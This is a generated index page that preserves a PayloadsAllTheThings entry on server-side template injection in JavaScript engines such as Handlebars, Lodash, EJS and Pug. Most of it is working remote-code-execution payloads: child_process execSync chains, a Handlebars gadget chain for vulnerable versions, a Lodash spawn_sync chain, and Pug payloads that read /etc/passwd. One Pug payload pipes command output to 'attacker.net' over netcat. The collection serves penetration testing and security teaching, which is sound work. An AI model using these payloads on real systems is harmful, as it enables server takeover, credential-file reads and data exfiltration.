---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Server Side Template Injection - JavaScript

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-server-side-template-injection-javascript` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/JavaScript.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Server Side Template Injection - JavaScript](../../topics/server-side-template-injection/server-side-template-injection-javascript.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-server-side-template-injection-javascript |
| name | Server Side Template Injection - JavaScript |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md |

## Preserved Source Material

````yaml
_body: "# Server Side Template Injection - JavaScript\n\n> Server-Side Template Injection (SSTI)  occurs when an attacker\
  \ can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In the context\
  \ of JavaScript, SSTI vulnerabilities can arise when using server-side templating engines like Handlebars, EJS, or Pug,\
  \ where user input is integrated into templates without adequate sanitization.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n\
  - [Universal Payloads](#universal-payloads)\n- [Handlebars](#handlebars)\n    - [Handlebars - Basic Injection](#handlebars---basic-injection)\n\
  \    - [Handlebars - Command Execution](#handlebars---command-execution)\n- [Lodash](#lodash)\n    - [Lodash - Basic Injection](#lodash---basic-injection)\n\
  \    - [Lodash - Command Execution](#lodash---command-execution)\n- [Pug](#pug)\n- [References](#references)\n\n## Templating\
  \ Libraries\n\n| Template Name | Payload Format   |\n|---------------|------------------|\n| DotJS         | `{{= }}`  \
  \       |\n| DustJS        | `{ }`            |\n| EJS           | `<% %>`          |\n| HandlebarsJS  | `{{ }}`       \
  \   |\n| HoganJS       | `{{ }}`          |\n| Lodash        | `{{= }}`         |\n| MustacheJS    | `{{ }}`          |\n\
  | NunjucksJS    | `{{ }}`          |\n| PugJS         | `#{ }`           |\n| TwigJS        | `{{ }}`          |\n| UnderscoreJS\
  \  | `<% %>`          |\n| VelocityJS    | `#=set($X=\"\")$X` |\n| VueJS         | `{{ }}`          |\n\n## Universal Payloads\n\
  \nGeneric code injection payloads work for many NodeJS-based template engines, such as DotJS, EJS, PugJS, UnderscoreJS and\
  \ Eta.\n\nTo use these payloads, wrap them in the appropriate tag.\n\n```javascript\n// Rendered RCE\nglobal.process.mainModule.require(\"\
  child_process\").execSync(\"id\").toString()\n\n// Error-Based RCE\nglobal.process.mainModule.require(\"Y:/A:/\"+global.process.mainModule.require(\"\
  child_process\").execSync(\"id\").toString())\n\"\"[\"x\"][global.process.mainModule.require(\"child_process\").execSync(\"\
  id\").toString()]\n\n// Boolean-Based RCE\n[\"\"][0 + !(global.process.mainModule.require(\"child_process\").spawnSync(\"\
  id\", options={shell:true}).status===0)][\"length\"]\n\n// Time-Based RCE\nglobal.process.mainModule.require(\"child_process\"\
  ).execSync(\"id && sleep 5\").toString()\n```\n\nNunjucksJS is also capable of executing these payloads using `{{range.constructor('\
  \ ... ')()}}`.\n\n## Handlebars\n\n[Official website](https://handlebarsjs.com/)\n> Handlebars compiles templates into JavaScript\
  \ functions.\n\n### Handlebars - Basic Injection\n\n```js\n{{this}}\n{{self}}\n```\n\n### Handlebars - Command Execution\n\
  \nThis payload only work in handlebars versions, fixed in [GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6):\n\
  \n- `>= 4.1.0`, `< 4.1.2`\n- `>= 4.0.0`, `< 4.0.14`\n- `< 3.0.7`\n\n```handlebars\n{{#with \"s\" as |string|}}\n  {{#with\
  \ \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n\
  \      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('ls\
  \ -la');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n    \
  \        {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}\n```\n\
  \n---\n\n## Lodash\n\n[Official website](https://lodash.com/docs/4.17.15)\n> A modern JavaScript utility library delivering\
  \ modularity, performance & extras.\n\n### Lodash - Basic Injection\n\nHow to create a template:\n\n```javascript\nconst\
  \ _ = require('lodash');\nstring = \"{{= username}}\"\nconst options = {\n  evaluate: /\\{\\{(.+?)\\}\\}/g,\n  interpolate:\
  \ /\\{\\{=(.+?)\\}\\}/g,\n  escape: /\\{\\{-(.+?)\\}\\}/g,\n};\n\n_.template(string, options);\n```\n\n- **string:** The\
  \ template string.\n- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.\n\
  - **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.\n- **options.escape:**\
  \ It is a regular expression that specifies the HTML *escape* delimiter.\n\nFor the purpose of RCE, the delimiter of templates\
  \ is determined by the **options.evaluate** parameter.\n\n```javascript\n{{= _.VERSION}}\n${= _.VERSION}\n<%= _.VERSION\
  \ %>\n\n\n{{= _.templateSettings.evaluate }}\n${= _.VERSION}\n<%= _.VERSION %>\n```\n\n### Lodash - Command Execution\n\n\
  ```js\n{{x=Object}}{{w=a=new x}}{{w.type=\"pipe\"}}{{w.readable=1}}{{w.writable=1}}{{a.file=\"/bin/sh\"}}{{a.args=[\"/bin/sh\"\
  ,\"-c\",\"id;ls\"]}}{{a.stdio=[w,w]}}{{process.binding(\"spawn_sync\").spawn(a).output}}\n```\n\n---\n\n## Pug\n\n> Universal\
  \ payloads also work for Pug.\n\n[Official website](https://pugjs.org/api/getting-started.html)\n>\n\n```javascript\n- var\
  \ x = root.process\n- x = x.mainModule.require\n- x = x('child_process')\n= x.exec('id | nc attacker.net 80')\n```\n\n```javascript\n\
  #{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}\n```\n\n## References\n\n-\
  \ [Exploiting Less.js to Achieve RCE - Jeremy Buis - July 1, 2021](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)\n\
  - [Handlebars template injection and RCE in a Shopify app - Mahmoud Gamal - April 4, 2019](https://web.archive.org/web/20260207143828/https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)\n\
  - [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)"
_relative_path: Server Side Template Injection/JavaScript.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/JavaScript.md
````
